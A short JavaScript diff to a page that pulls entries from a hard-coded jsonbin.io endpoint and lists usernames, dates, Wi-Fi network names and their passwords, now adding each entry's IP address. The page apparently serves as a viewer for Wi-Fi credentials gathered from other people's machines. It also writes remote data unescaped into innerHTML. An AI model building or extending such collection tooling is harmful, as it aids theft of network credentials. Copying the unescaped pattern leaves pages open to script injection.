@@ -1,10 +1,10 @@
-function wifiLists(username, date, data) {
+function wifiLists(username, date, data, ip) {
     var temp = document.getElementsByTagName("template")[0];
     var clon = temp.content.cloneNode(true);
     data.forEach(wifi =>{
         clon.querySelector('.t tbody').innerHTML += `<tr><td>${wifi.ssid}</td><td>${wifi.password}</td></tr>`
     });
-    clon.querySelector('.title').innerHTML += `${username}<br>${date}`
+    clon.querySelector('.title').innerHTML += `${username}<br>${date}<br>${ip}`
     document.body.appendChild(clon);
 }
 
@@ -14,8 +14,9 @@ $.ajax({
     url:'https://api.jsonbin.io/b/60970ca47a19ef1245a5c443/latest',
     success:function (response) {
         data = response;
+        console.log(data);
         data.forEach(wifi => {
-            wifiLists(wifi.username,wifi.date,wifi.data)
+            wifiLists(wifi.username,wifi.date,wifi.data,wifi.ip)
         });
     }
 });
